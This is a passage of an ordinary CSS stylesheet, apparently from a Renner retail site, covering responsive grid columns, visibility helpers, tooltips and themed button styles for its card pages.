         flex: 0 0 75%;
         max-width: 75%; }
         .medium-offset-8 {
         margin-left: 66.66667%; }
         .medium-10 {
         -webkit-box-flex: 0;
         flex: 0 0 83.33333%;
         max-width: 83.33333%; }
         .medium-offset-9 {
         margin-left: 75%; }
         .medium-11 {
         -webkit-box-flex: 0;
         flex: 0 0 91.66667%;
         max-width: 91.66667%; }
         .medium-offset-10 {
         margin-left: 83.33333%; }
         .medium-12 {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .medium-offset-11 {
         margin-left: 91.66667%; }
         .medium-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .medium-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .medium-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .medium-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .medium-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .medium-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; }
         .medium-up-1 {
         flex-wrap: wrap; }
         .medium-up-1 > .column, .medium-up-1 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .medium-up-2 {
         flex-wrap: wrap; }
         .medium-up-2 > .column, .medium-up-2 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .medium-up-3 {
         flex-wrap: wrap; }
         .medium-up-3 > .column, .medium-up-3 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .medium-up-4 {
         flex-wrap: wrap; }
         .medium-up-4 > .column, .medium-up-4 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .medium-up-5 {
         flex-wrap: wrap; }
         .medium-up-5 > .column, .medium-up-5 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 20%;
         max-width: 20%; }
         .medium-up-6 {
         flex-wrap: wrap; }
         .medium-up-6 > .column, .medium-up-6 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .medium-up-7 {
         flex-wrap: wrap; }
         .medium-up-7 > .column, .medium-up-7 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 14.28571%;
         max-width: 14.28571%; }
         .medium-up-8 {
         flex-wrap: wrap; }
         .medium-up-8 > .column, .medium-up-8 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 12.5%;
         max-width: 12.5%; } }
         @media print, screen and (min-width: 48em) and (min-width: 48em) {
         .medium-expand {
         -webkit-box-flex: 1;
         flex: 1 1 0px; } }
         @media print, screen and (min-width: 48em) {
         .medium-flex-dir-row {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row; }
         .medium-flex-dir-row-reverse {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: reverse;
         flex-direction: row-reverse; }
         .medium-flex-dir-column {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .medium-flex-dir-column-reverse {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse; }
         .medium-flex-child-auto {
         -webkit-box-flex: 1;
         flex: 1 1 auto; }
         .medium-flex-child-grow {
         -webkit-box-flex: 1;
         flex: 1 0 auto; }
         .medium-flex-child-shrink {
         -webkit-box-flex: 0;
         flex: 0 1 auto; } }
         .row.medium-unstack > .column, .row.medium-unstack > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 100%; }
         @media print, screen and (min-width: 48em) {
         .row.medium-unstack > .column, .row.medium-unstack > .columns {
         -webkit-box-flex: 1;
         flex: 1 1 0px; } }
         @media print, screen and (min-width: 48em) {
         .medium-collapse > .column, .medium-collapse > .columns {
         padding-right: 0;
         padding-left: 0; }
         .medium-uncollapse > .column, .medium-uncollapse > .columns {
         padding-right: 0.9375rem;
         padding-left: 0.9375rem; } }
         @media print, screen and (min-width: 64em) {
         .large-1 {
         -webkit-box-flex: 0;
         flex: 0 0 8.33333%;
         max-width: 8.33333%; }
         .large-offset-0 {
         margin-left: 0%; }
         .large-2 {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .large-offset-1 {
         margin-left: 8.33333%; }
         .large-3 {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .large-offset-2 {
         margin-left: 16.66667%; }
         .large-4 {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .large-offset-3 {
         margin-left: 25%; }
         .large-5 {
         -webkit-box-flex: 0;
         flex: 0 0 41.66667%;
         max-width: 41.66667%; }
         .large-offset-4 {
         margin-left: 33.33333%; }
         .large-6 {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .large-offset-5 {
         margin-left: 41.66667%; }
         .large-7 {
         -webkit-box-flex: 0;
         flex: 0 0 58.33333%;
         max-width: 58.33333%; }
         .large-offset-6 {
         margin-left: 50%; }
         .large-8 {
         -webkit-box-flex: 0;
         flex: 0 0 66.66667%;
         max-width: 66.66667%; }
         .large-offset-7 {
         margin-left: 58.33333%; }
         .large-9 {
         -webkit-box-flex: 0;
         flex: 0 0 75%;
         max-width: 75%; }
         .large-offset-8 {
         margin-left: 66.66667%; }
         .large-10 {
         -webkit-box-flex: 0;
         flex: 0 0 83.33333%;
         max-width: 83.33333%; }
         .large-offset-9 {
         margin-left: 75%; }
         .large-11 {
         -webkit-box-flex: 0;
         flex: 0 0 91.66667%;
         max-width: 91.66667%; }
         .large-offset-10 {
         margin-left: 83.33333%; }
         .large-12 {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .large-offset-11 {
         margin-left: 91.66667%; }
         .large-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .large-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .large-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .large-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .large-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .large-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; }
         .large-up-1 {
         flex-wrap: wrap; }
         .large-up-1 > .column, .large-up-1 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 100%;
         max-width: 100%; }
         .large-up-2 {
         flex-wrap: wrap; }
         .large-up-2 > .column, .large-up-2 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 50%;
         max-width: 50%; }
         .large-up-3 {
         flex-wrap: wrap; }
         .large-up-3 > .column, .large-up-3 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 33.33333%;
         max-width: 33.33333%; }
         .large-up-4 {
         flex-wrap: wrap; }
         .large-up-4 > .column, .large-up-4 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 25%;
         max-width: 25%; }
         .large-up-5 {
         flex-wrap: wrap; }
         .large-up-5 > .column, .large-up-5 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 20%;
         max-width: 20%; }
         .large-up-6 {
         flex-wrap: wrap; }
         .large-up-6 > .column, .large-up-6 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 16.66667%;
         max-width: 16.66667%; }
         .large-up-7 {
         flex-wrap: wrap; }
         .large-up-7 > .column, .large-up-7 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 14.28571%;
         max-width: 14.28571%; }
         .large-up-8 {
         flex-wrap: wrap; }
         .large-up-8 > .column, .large-up-8 > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 12.5%;
         max-width: 12.5%; } }
         @media print, screen and (min-width: 64em) and (min-width: 64em) {
         .large-expand {
         -webkit-box-flex: 1;
         flex: 1 1 0px; } }
         @media print, screen and (min-width: 64em) {
         .large-flex-dir-row {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: normal;
         flex-direction: row; }
         .large-flex-dir-row-reverse {
         -webkit-box-orient: horizontal;
         -webkit-box-direction: reverse;
         flex-direction: row-reverse; }
         .large-flex-dir-column {
         -webkit-box-orient: vertical;
         -webkit-box-direction: normal;
         flex-direction: column; }
         .large-flex-dir-column-reverse {
         -webkit-box-orient: vertical;
         -webkit-box-direction: reverse;
         flex-direction: column-reverse; }
         .large-flex-child-auto {
         -webkit-box-flex: 1;
         flex: 1 1 auto; }
         .large-flex-child-grow {
         -webkit-box-flex: 1;
         flex: 1 0 auto; }
         .large-flex-child-shrink {
         -webkit-box-flex: 0;
         flex: 0 1 auto; } }
         .row.large-unstack > .column, .row.large-unstack > .columns {
         -webkit-box-flex: 0;
         flex: 0 0 100%; }
         @media print, screen and (min-width: 64em) {
         .row.large-unstack > .column, .row.large-unstack > .columns {
         -webkit-box-flex: 1;
         flex: 1 1 0px; } }
         @media print, screen and (min-width: 64em) {
         .large-collapse > .column, .large-collapse > .columns {
         padding-right: 0;
         padding-left: 0; }
         .large-uncollapse > .column, .large-uncollapse > .columns {
         padding-right: 0.9375rem;
         padding-left: 0.9375rem; } }
         .shrink {
         -webkit-box-flex: 0;
         flex: 0 0 auto;
         max-width: 100%; }
         .column-block {
         margin-bottom: 1.25rem; }
         .column-block > :last-child {
         margin-bottom: 0; }
         @media print, screen and (min-width: 48em) {
         .column-block {
         margin-bottom: 1.875rem; }
         .column-block > :last-child {
         margin-bottom: 0; } }
         .has-tip {
         position: relative;
         display: inline-block;
         border-bottom: dotted 1px #8a8a8a;
         font-weight: bold;
         cursor: help; }
         .tooltip {
         position: absolute;
         top: calc(100% + 0.6495rem);
         z-index: 1200;
         max-width: 10rem;
         padding: 0.75rem;
         border-radius: 0;
         background-color: #0a0a0a;
         font-size: 12px;
         color: #fff; }
         .tooltip::before {
         display: block;
         width: 0;
         height: 0;
         border: inset 0.75rem;
         content: '';
         border-top-width: 0;
         border-bottom-style: solid;
         border-color: transparent transparent #0a0a0a;
         position: absolute;
         bottom: 100%;
         left: 50%;
         -webkit-transform: translateX(-50%);
         transform: translateX(-50%); }
         .tooltip.top::before {
         display: block;
         width: 0;
         height: 0;
         border: inset 0.75rem;
         content: '';
         border-bottom-width: 0;
         border-top-style: solid;
         border-color: #0a0a0a transparent transparent;
         top: 100%;
         bottom: auto; }
         .tooltip.left::before {
         display: block;
         width: 0;
         height: 0;
         border: inset 0.75rem;
         content: '';
         border-right-width: 0;
         border-left-style: solid;
         border-color: transparent transparent transparent #0a0a0a;
         top: 50%;
         bottom: auto;
         left: 100%;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%); }
         .tooltip.right::before {
         display: block;
         width: 0;
         height: 0;
         border: inset 0.75rem;
         content: '';
         border-left-width: 0;
         border-right-style: solid;
         border-color: transparent #0a0a0a transparent transparent;
         top: 50%;
         right: 100%;
         bottom: auto;
         left: auto;
         -webkit-transform: translateY(-50%);
         transform: translateY(-50%); }
         .align-right {
         -webkit-box-pack: end;
         justify-content: flex-end; }
         .align-center {
         -webkit-box-pack: center;
         justify-content: center; }
         .align-justify {
         -webkit-box-pack: justify;
         justify-content: space-between; }
         .align-spaced {
         justify-content: space-around; }
         .align-top {
         -webkit-box-align: start;
         align-items: flex-start; }
         .align-self-top {
         align-self: flex-start; }
         .align-bottom {
         -webkit-box-align: end;
         align-items: flex-end; }
         .align-self-bottom {
         align-self: flex-end; }
         .align-middle {
         -webkit-box-align: center;
         align-items: center; }
         .align-self-middle {
         align-self: center; }
         .align-stretch {
         -webkit-box-align: stretch;
         align-items: stretch; }
         .align-self-stretch {
         align-self: stretch; }
         .small-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .small-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .small-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .small-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .small-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .small-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; }
         @media print, screen and (min-width: 48em) {
         .medium-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .medium-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .medium-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .medium-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .medium-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .medium-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; } }
         @media print, screen and (min-width: 64em) {
         .large-order-1 {
         -webkit-box-ordinal-group: 2;
         order: 1; }
         .large-order-2 {
         -webkit-box-ordinal-group: 3;
         order: 2; }
         .large-order-3 {
         -webkit-box-ordinal-group: 4;
         order: 3; }
         .large-order-4 {
         -webkit-box-ordinal-group: 5;
         order: 4; }
         .large-order-5 {
         -webkit-box-ordinal-group: 6;
         order: 5; }
         .large-order-6 {
         -webkit-box-ordinal-group: 7;
         order: 6; } }
         .align-center-middle {
         align-content: center;
         -webkit-box-pack: center;
         justify-content: center;
         -webkit-box-align: center;
         align-items: center; }
         @media (max-width: 767px) {
         .hidden-eq-small {
         display: none !important; } }
         @media (min-width: 768px) {
         .hidden-ne-small {
         display: none !important; } }
         @media (min-width: 768px) {
         .hidden-gt-small {
         display: none !important; } }
         @media (max-width: 767px) {
         .hidden-le-small {
         display: none !important; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .hidden-eq-medium {
         display: none !important; } }
         @media (min-width: 1023px), (max-width: 768px) {
         .hidden-ne-medium {
         display: none !important; } }
         @media (max-width: 767px) {
         .hidden-lt-medium {
         display: none !important; } }
         @media (min-width: 1024px) {
         .hidden-gt-medium {
         display: none !important; } }
         @media (min-width: 768px) {
         .hidden-ge-medium {
         display: none !important; } }
         @media (max-width: 1023px) {
         .hidden-le-medium {
         display: none !important; } }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .hidden-eq-large {
         display: none !important; } }
         @media (min-width: 1199px), (max-width: 1024px) {
         .hidden-ne-large {
         display: none !important; } }
         @media (max-width: 1023px) {
         .hidden-lt-large {
         display: none !important; } }
         @media (min-width: 1200px) {
         .hidden-gt-large {
         display: none !important; } }
         @media (min-width: 1024px) {
         .hidden-ge-large {
         display: none !important; } }
         @media (max-width: 1199px) {
         .hidden-le-large {
         display: none !important; } }
         @media (min-width: 1200px) and (max-width: 1439px) {
         .hidden-eq-xlarge {
         display: none !important; } }
         @media (min-width: 1439px), (max-width: 1200px) {
         .hidden-ne-xlarge {
         display: none !important; } }
         @media (max-width: 1199px) {
         .hidden-lt-xlarge {
         display: none !important; } }
         @media (min-width: 1440px) {
         .hidden-gt-xlarge {
         display: none !important; } }
         @media (min-width: 1200px) {
         .hidden-ge-xlarge {
         display: none !important; } }
         @media (max-width: 1439px) {
         .hidden-le-xlarge {
         display: none !important; } }
         @media (min-width: 1440px) and (max-width: 1599px) {
         .hidden-eq-xxlarge {
         display: none !important; } }
         @media (min-width: 1599px), (max-width: 1440px) {
         .hidden-ne-xxlarge {
         display: none !important; } }
         @media (max-width: 1439px) {
         .hidden-lt-xxlarge {
         display: none !important; } }
         @media (min-width: 1600px) {
         .hidden-gt-xxlarge {
         display: none !important; } }
         @media (min-width: 1440px) {
         .hidden-ge-xxlarge {
         display: none !important; } }
         @media (max-width: 1599px) {
         .hidden-le-xxlarge {
         display: none !important; } }
         @media (min-width: 1600px) {
         .hidden-eq-xxxlarge {
         display: none !important; } }
         @media (max-width: 1599px) {
         .hidden-ne-xxxlarge {
         display: none !important; } }
         @media (max-width: 1599px) {
         .hidden-lt-xxxlarge {
         display: none !important; } }
         @media (min-width: 1600px) {
         .hidden-ge-xxxlarge {
         display: none !important; } }
         .ie .ng-hide.ng-hide-animate,
         .edge .ng-hide.ng-hide-animate {
         display: none !important; }
         .no-padding-l {
         padding-left: 0 !important; }
         .no-padding-r {
         padding-right: 0 !important; }
         .no-padding-lr {
         padding-right: 0 !important;
         padding-left: 0 !important; }
         .text-capitalize {
         text-transform: capitalize !important; }
         .text-upper {
         text-transform: uppercase !important; }
         .text-lower {
         text-transform: lowercase !important; }
         .text-normal {
         text-transform: none !important; }
         .text-bold {
         font-weight: 700 !important; }
         .text-light {
         font-weight: 300 !important; }
         .text-left {
         text-align: left; }
         .text-right {
         text-align: right; }
         .text-center {
         text-align: center; }
         .align-middle {
         -webkit-box-align: center;
         align-items: center; }
         .block {
         display: block; }
         .no-margin-bottom {
         margin-bottom: 0; }
         @media (min-width: 768px) {
         .mb-15 {
         margin-bottom: 15px; } }
         @media only screen and (max-width: 767px) {
         .no-padding-l {
         padding-left: 10px !important; }
         .no-padding-r {
         padding-right: 10px !important; }
         .no-padding-lr {
         padding-right: 10px !important;
         padding-left: 10px !important; } }
         a,
         label,
         button {
         text-transform: lowercase; }
         a {
         text-decoration: underline;
         color: #8a8a8a; }
         a:hover {
         color: #0a0a0a; }
         svg {
         display: block;
         fill: currentColor;
         pointer-events: none; }
         .badge-app-store svg {
         fill: inherit; }
         [type="radio"] {
         margin-right: 15px; }
         .safari [type="radio"] {
         border-radius: 50%; }
         .shown {
         display: block !important; }
         .hidden {
         display: none !important; }
         .visible {
         visibility: visible !important; }
         .invisible {
         visibility: hidden !important; }
         table {
         width: 100%; }
         ul {
         padding: 0; }
         p {
         margin-top: 0; }
         hr {
         clear: both;
         margin: 1.25rem auto;
         border-top: 0;
         border-right: 0;
         border-bottom: 1px solid #cacaca;
         border-left: 0;
         max-width: 75rem;
         height: 0; }
         .button {
         height: 50px;
         line-height: 46px; }
         .button.button--small {
         height: 42px;
         line-height: 38px; }
         .button.button--smaller {
         height: 22px;
         line-height: 18px; }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .button.button--responsive {
         height: 50px;
         line-height: 46px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .button.button--responsive {
         height: 50px;
         line-height: 46px; } }
         @media (max-width: 767px) {
         .button.button--responsive {
         height: 42px;
         line-height: 38px; } }
         .buttons--outline .button,
         .button.button--outline {
         height: 50px;
         line-height: 48px; }
         .buttons--outline .button.button--small,
         .button.button--outline.button--small {
         height: 42px;
         line-height: 40px; }
         .buttons--outline .button.button--smaller,
         .button.button--outline.button--smaller {
         height: 22px;
         line-height: 20px; }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .buttons--outline .button.button--responsive,
         .button.button--outline.button--responsive {
         height: 50px;
         line-height: 46px; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .buttons--outline .button.button--responsive,
         .button.button--outline.button--responsive {
         height: 50px;
         line-height: 46px; } }
         @media (max-width: 767px) {
         .buttons--outline .button.button--responsive,
         .button.button--outline.button--responsive {
         height: 42px;
         line-height: 38px; } }
         .button {
         display: inline-block;
         position: relative;
         -webkit-transition: background-color 0.1s cubic-bezier(0.4, 0, 0.2, 1), color 0.1s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.1s cubic-bezier(0.4, 0, 0.2, 1);
         transition: background-color 0.1s cubic-bezier(0.4, 0, 0.2, 1), color 0.1s cubic-bezier(0.4, 0, 0.2, 1), border-color 0.1s cubic-bezier(0.4, 0, 0.2, 1);
         margin: 0;
         outline: none;
         border: 2px solid transparent;
         border-radius: 3px;
         background: #1e1e1f;
         cursor: pointer;
         padding: 0 1em;
         min-width: 50px;
         overflow: hidden;
         vertical-align: middle;
         text-align: center;
         text-decoration: none;
         letter-spacing: -0.02em;
         white-space: nowrap;
         color: #fff;
         will-change: box-shadow;
         -webkit-tap-highlight-color: rgba(0, 0, 0, 0);
         text-transform: lowercase;
         letter-spacing: 0;
         font-size: 18px;
         font-weight: 400;
         font-family: Roboto, Arial, Helvetica, Helvetica Neue, sans-serif; }
         .button::-moz-focus-inner {
         border: 0; }
         .button:active {
         border: 2px solid black;
         background-color: #1e1e1f; }
         .button.button--smaller {
         padding: 0 0.5em;
         font-size: 12px; }
         .button.button--small {
         padding: 0 0.5em;
         font-size: 16px; }
         .button.button--fixed-size.button--small {
         min-width: 150px; }
         .button.button--no-style {
         border: none !important;
         background-color: transparent !important; }
         .button:focus:active span {
         position: relative;
         top: 0;
         left: 0; }
         a.button:hover {
         color: #fff; }
         input.button[type="submit"] {
         -webkit-appearance: none; }
         @media (max-width: 767px) {
         .button--small-expanded {
         display: block;
         width: 100%; } }
         @media (min-width: 768px) and (max-width: 1023px) {
         .button--medium-expanded {
         display: block;
         width: 100%; } }
         @media (min-width: 1024px) and (max-width: 1199px) {
         .button--large-expanded {
         display: block;
         width: 100%; } }
         @media (min-width: 1200px) {
         .button--x-large-expanded {
         display: block;
         width: 100%; } }
         .button--expanded {
         display: block;
         width: 100%; }
         @media only screen and (min-width: 998px) {
         .button:hover {
         border-color: #000;
         background-color: #000;
         color: #fff; }
         .button:hover svg path {
         fill: #fff; }
         .button:hover svg rect {
         fill: #fff; } }
         .button, .button:focus {
         border-color: #1e1e1f;
         background-color: #1e1e1f;
         color: #fff; }
         .button:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         .button:active svg path {
         fill: #fff; }
         .button:active svg rect {
         fill: #fff; }
         .button[disabled], .button[disabled]:focus, .button[disabled]:active, .button[disabled]:hover, .button.button--disabled, .button.button--disabled:focus, .button.button--disabled:active, .button.button--disabled:hover {
         border-color: #ddd;
         background-color: #ddd;
         cursor: default;
         color: #fff; }
         @media only screen and (min-width: 998px) {
         .buttons--outline .button:hover, .buttons--outline .button:hover:focus, .button.button--outline:hover, .button.button--outline:hover:focus {
         border-color: #000;
         background-color: #000;
         color: #fff; } }
         .buttons--outline .button, .buttons--outline .button:focus, .button.button--outline, .button.button--outline:focus {
         border: 1px solid #1e1e1f;
         background-color: #fff;
         color: #1e1e1f; }
         .buttons--outline .button:active, .button.button--outline:active {
         border-color: #000;
         background-color: #313133;
         color: #fff; }
         :not(.loader--show) .buttons--outline .button[disabled], :not(.loader--show) .buttons--outline .button[disabled]:focus, :not(.loader--show) .buttons--outline .button[disabled]:active, :not(.loader--show) .buttons--outline .button[disabled]:hover,
         :not(.loader--show) .buttons--outline .button.button--disabled,
         :not(.loader--show) .buttons--outline .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline .button.button--disabled:active,
         :not(.loader--show) .buttons--outline .button.button--disabled:hover, :not(.loader--show) .button.button--outline[disabled], :not(.loader--show) .button.button--outline[disabled]:focus, :not(.loader--show) .button.button--outline[disabled]:active, :not(.loader--show) .button.button--outline[disabled]:hover,
         :not(.loader--show) .button.button--outline.button--disabled,
         :not(.loader--show) .button.button--outline.button--disabled:focus,
         :not(.loader--show) .button.button--outline.button--disabled:active,
         :not(.loader--show) .button.button--outline.button--disabled:hover {
         border: 1px solid #ddd;
         background-color: #fff;
         cursor: default;
         color: #ddd; }
         .loader--show .button,
         .loader--show .button[disabled] {
         border: 2px solid transparent;
         background-color: #1e1e1f;
         color: #fff; }
         .button i svg path {
         fill: #1e1e1f; }
         .button i svg rect {
         fill: #1e1e1f; }
         @media only screen and (min-width: 998px) {
         .cartao-renner .button:hover,
         .meu-cartao .cartao-renner .button:hover {
         border-color: #810f13;
         background-color: #810f13;
         color: #fff; }
         .cartao-renner .button:hover svg path,
         .meu-cartao .cartao-renner .button:hover svg path {
         fill: #fff; }
         .cartao-renner .button:hover svg rect,
         .meu-cartao .cartao-renner .button:hover svg rect {
         fill: #fff; } }
         .cartao-renner .button, .cartao-renner .button:focus,
         .meu-cartao .cartao-renner .button,
         .meu-cartao .cartao-renner .button:focus {
         border-color: #d71920;
         background-color: #d71920;
         color: #fff; }
         .cartao-renner .button:active,
         .meu-cartao .cartao-renner .button:active {
         border-color: #55000a;
         background-color: #810f13;
         color: #fff; }
         .cartao-renner .button:active svg path,
         .meu-cartao .cartao-renner .button:active svg path {
         fill: #fff; }
         .cartao-renner .button:active svg rect,
         .meu-cartao .cartao-renner .button:active svg rect {
         fill: #fff; }
         .cartao-renner .button[disabled], .cartao-renner .button[disabled]:focus, .cartao-renner .button[disabled]:active, .cartao-renner .button[disabled]:hover, .cartao-renner .button.button--disabled, .cartao-renner .button.button--disabled:focus, .cartao-renner .button.button--disabled:active, .cartao-renner .button.button--disabled:hover,
         .meu-cartao .cartao-renner .button[disabled],
         .meu-cartao .cartao-renner .button[disabled]:focus,
         .meu-cartao .cartao-renner .button[disabled]:active,
         .meu-cartao .cartao-renner .button[disabled]:hover,
         .meu-cartao .cartao-renner .button.button--disabled,
         .meu-cartao .cartao-renner .button.button--disabled:focus,
         .meu-cartao .cartao-renner .button.button--disabled:active,
         .meu-cartao .cartao-renner .button.button--disabled:hover {
         border-color: #ddd;
         background-color: #ddd;
         cursor: default;
         color: #fff; }
         @media only screen and (min-width: 998px) {
         .buttons--outline .cartao-renner .button:hover, .buttons--outline .cartao-renner .button:hover:focus, .cartao-renner .button.button--outline:hover, .cartao-renner .button.button--outline:hover:focus, .buttons--outline
         .meu-cartao .cartao-renner .button:hover, .buttons--outline
         .meu-cartao .cartao-renner .button:hover:focus,
         .meu-cartao .cartao-renner .button.button--outline:hover,
         .meu-cartao .cartao-renner .button.button--outline:hover:focus {
         border-color: #810f13;
         background-color: #810f13;
         color: #fff; } }
         .buttons--outline .cartao-renner .button, .buttons--outline .cartao-renner .button:focus, .cartao-renner .button.button--outline, .cartao-renner .button.button--outline:focus, .buttons--outline
         .meu-cartao .cartao-renner .button, .buttons--outline
         .meu-cartao .cartao-renner .button:focus,
         .meu-cartao .cartao-renner .button.button--outline,
         .meu-cartao .cartao-renner .button.button--outline:focus {
         border: 1px solid #d71920;
         background-color: #fff;
         color: #d71920; }
         .buttons--outline .cartao-renner .button:active, .cartao-renner .button.button--outline:active, .buttons--outline
         .meu-cartao .cartao-renner .button:active,
         .meu-cartao .cartao-renner .button.button--outline:active {
         border-color: #55000a;
         background-color: #810f13;
         color: #fff; }
         :not(.loader--show) .buttons--outline .cartao-renner .button[disabled], :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:focus, :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:active, :not(.loader--show) .buttons--outline .cartao-renner .button[disabled]:hover,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--disabled,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--disabled:active,
         :not(.loader--show) .buttons--outline .cartao-renner .button.button--disabled:hover, :not(.loader--show) .cartao-renner .button.button--outline[disabled], :not(.loader--show) .cartao-renner .button.button--outline[disabled]:focus, :not(.loader--show) .cartao-renner .button.button--outline[disabled]:active, :not(.loader--show) .cartao-renner .button.button--outline[disabled]:hover,
         :not(.loader--show) .cartao-renner .button.button--outline.button--disabled,
         :not(.loader--show) .cartao-renner .button.button--outline.button--disabled:focus,
         :not(.loader--show) .cartao-renner .button.button--outline.button--disabled:active,
         :not(.loader--show) .cartao-renner .button.button--outline.button--disabled:hover, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button[disabled], :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button[disabled]:focus, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button[disabled]:active, :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button[disabled]:hover,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--disabled,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--disabled:focus,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--disabled:active,
         :not(.loader--show) .buttons--outline
         .meu-cartao .cartao-renner .button.button--disabled:hover, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline[disabled], :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline[disabled]:focus, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline[disabled]:active, :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline[disabled]:hover,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline.button--disabled,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline.button--disabled:focus,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline.button--disabled:active,
         :not(.loader--show)
         .meu-cartao .cartao-renner .button.button--outline.button--disabled:hover {
         border: 1px solid #ddd;
         background-color: #fff;
         cursor: default;
         color: #ddd; }
         .cartao-renner .loader--show .button,
         .cartao-renner .loader--show .button[disabled],
         .meu-cartao .cartao-renner .loader--show .button,
         .meu-cartao .cartao-renner .loader--show .button[disabled] {
         border: 2px solid transparent;
         background-color: #d71920;
         color: #fff; }
         .cartao-renner .button i svg path,
         .meu-cartao .cartao-renner .button i svg path {
         fill: #d71920; }
         .cartao-renner .button i svg rect,
         .meu-cartao .cartao-renner .button i svg rect {
         fill: #d71920; }
         @media only screen and (min-width: 998px) {
         .meu-cartao .button:hover,
         .cartao-renner .meu-cartao .button:hover {
         border-color: #91743c;
         background-color: #91743c;
         color: #fff; }
         .meu-cartao .button:hover svg path,
         .cartao-renner .meu-cartao .button:hover svg path {
         fill: #fff; }
         .meu-cartao .button:hover svg rect,
         .cartao-renner .meu-cartao .button:hover svg rect {
         fill: #fff; } }
         .meu-cartao .button, .meu-cartao .button:focus,
         .cartao-renner .meu-cartao .button,
         .cartao-renner .meu-cartao .button:focus {
         border-color: #ac8947;
         background-color: #ac8947;
         color: #fff; }
         .meu-cartao .button:active,
         .cartao-renner .meu-cartao .button:active {
         border-color: #47391d;
         background-color: #91743c;
         color: #fff; }
         .meu-cartao .button:active svg path,
         .cartao-renner .meu-cartao .button:active svg path {
         fill: #fff; }
         .meu-cartao .button:active svg rect,
         .cartao-renner .meu-cartao .button:active svg rect {
         fill: #fff; }
